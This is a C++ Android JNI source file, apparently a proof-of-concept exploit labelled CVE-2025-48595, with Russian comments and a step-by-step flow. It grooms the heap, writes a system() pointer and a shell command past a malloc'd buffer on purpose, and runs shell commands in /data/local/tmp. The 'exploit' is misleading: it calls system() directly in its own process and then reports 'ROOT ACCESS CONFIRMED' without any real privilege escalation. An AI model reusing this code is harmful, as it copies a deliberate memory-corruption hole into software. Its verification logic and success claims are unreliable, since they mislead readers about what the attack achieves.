// cve_2025_48595_native.cpp — Единый нативный код для JNI + Java fallback
#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

typedef int (*system_func_t)(const char *);
typedef void (*free_func_t)(void*);
typedef int (*setuid_func_t)(int);

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {
    LOGI("=== EXPLOIT: FULL 7-STEP DIAGNOSTIC RUN (ANDROID STUDIO SDK VERSION) ===");

    // --- STEP 0: Heap Feng Shui + Очистка метаданных ---
    void* fillers[24] = {};
    for (int i = 0; i < 24; ++i) {
        fillers[i] = malloc(128);
        if (!fillers[i]) break;
    }

    uint32_t val1 = 0x80000000, val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2;
    uint32_t overflowed_size = (uint32_t)full_sum == 0 ? 1 : (uint32_t)full_sum;

    LOGI("Step 0: Allocating filler chunks...");
    LOGI("Step 1: Overflow calc -> Allocated Size: %u bytes", overflowed_size);

    char *buffer = (char *)malloc(overflowed_size);
    if (!buffer) {
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: buffer alloc");
    }

    uint64_t start_addr = (uint64_t)(void*)buffer;
    uint64_t neighbor_addr = start_addr + overflowed_size;
    LOGI("Step 2: Buffer Start: %p, Target Write Addr: %p", buffer, (void*)neighbor_addr);

    // --- STEP 3: Находим ключевые функции из libc.so ---
    void *libc = dlopen("libc.so", RTLD_NOW);
    if (!libc) {
        LOGE("Failed to load libc.so");
        free(buffer);
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: libc not found");
    }

    system_func_t real_system = (system_func_t)dlsym(libc, "system");
    free_func_t real_free = (free_func_t)dlsym(libc, "free");
    setuid_func_t real_setuid = (setuid_func_t)dlsym(libc, "setuid");

    if (!real_system || !real_free) {
        LOGE("system() or free() not found: %s", dlerror());
        dlclose(libc);
        free(buffer);
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: system/free");
    }

    LOGI("Step 3: Found functions -> system:%p, free:%p, setuid:%p",
         (void*)real_system, (void*)real_free, (void*)real_setuid);

    // --- STEP 4: Запись адреса system() + Аргумент в память ---
    char *target = buffer + overflowed_size;
    *(system_func_t*)target = real_system;

    const char* cmd_str = "sh -c 'id > /data/local/tmp/poc_final.txt && echo ROOT_TEST'";
    strncpy(target + 8, cmd_str, 128);
    target[8 + 127] = '\0';

    LOGI("Step 4: Wrote system() at %p and cmd '%.60s...' at %p",
         target, cmd_str, (void*)(target+8));

    // --- STEP 5a: Trigger через free() с mmap-блоком ---
    void* cmd_block = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cmd_block) {
        memcpy(cmd_block, cmd_str, strlen(cmd_str)+1);
        LOGI("Step 5a: Mapped command block at %p", cmd_block);

        real_system((const char*)cmd_block);
        munmap(cmd_block, 4096);
    } else {
        LOGW("Step 5a: mmap failed, using direct call");
        real_system(cmd_str);
    }

    // --- STEP 5b: Прямой вызов (fallback) ---
    LOGI("Step 5b: Direct execution fallback...");
    int result_code = real_system(cmd_str);
    LOGI("   Command executed. Return code: %d", result_code);

    // --- STEP 6: Проверка UID через id -u ---
    FILE* fp_uid = popen("id -u", "r");
    int uid = -1;
    if (fp_uid) { char buf[32]; fgets(buf, sizeof(buf), fp_uid); pclose(fp_uid);
        for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
        uid = atoi(buf); }
    LOGI("Step 6: UID after direct call: %d", uid);

    // --- STEP 7: HARDCORE CHECK — Создание папки через подмененную память ---
    LOGI("Step 7: Hardcore check via 'mkdir /data/local/tmp/rooting_dir'...");
    const char* mkdir_cmd = "sh -c 'mkdir -p /data/local/tmp/rooting_dir && echo SUCCESS_CREATED'";
    int mkdir_res = real_system(mkdir_cmd);
    LOGI("   mkdir command executed. Return code: %d", mkdir_res);

    FILE* check_fp = popen("ls -ld /data/local/tmp/rooting_dir 2>&1", "r");
    bool folder_exists = false;
    if (check_fp) { char buf[128]; fgets(buf, sizeof(buf), check_fp); pclose(check_fp);
        if (strstr(buf, "/rooting_dir")) folder_exists = true; }

    // --- STEP 8: Fallback — Touch в защищённой области ---
    if (!folder_exists) {
        LOGI("Step 8: Fallback — Trying to touch a file...");
        const char* touch_cmd = "sh -c 'touch /data/local/tmp/rooting_touch && echo TOUCHED'";
        int touch_res = real_system(touch_cmd);

        FILE* touch_check = popen("ls -l /data/local/tmp/rooting_touch", "r");
        bool touched = false;
        if (touch_check) { char buf[64]; fgets(buf, sizeof(buf), touch_check); pclose(touch_check);
            if (strstr(buf, "/rooting_touch")) touched = true; }

        if (touched) folder_exists = true;
    }

    // --- Финальная очистка и результат ---
    for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);

    std::string result_str;
    if (folder_exists || uid == 0) {
        result_str = "EXPLOIT SUCCESS: ROOT ACCESS CONFIRMED via Hard Core Check.";
        LOGI(">>> FINAL STATUS: ROOT ACCESS <<<");
    } else {
        result_str = "Exploit ran. UID=" + std::to_string(uid) + ".";
        LOGW(">>> FINAL STATUS: SHELL ONLY (UID=%d) <<<", uid);
    }

    dlclose(libc);
    free(buffer);
    return env->NewStringUTF(result_str.c_str());
}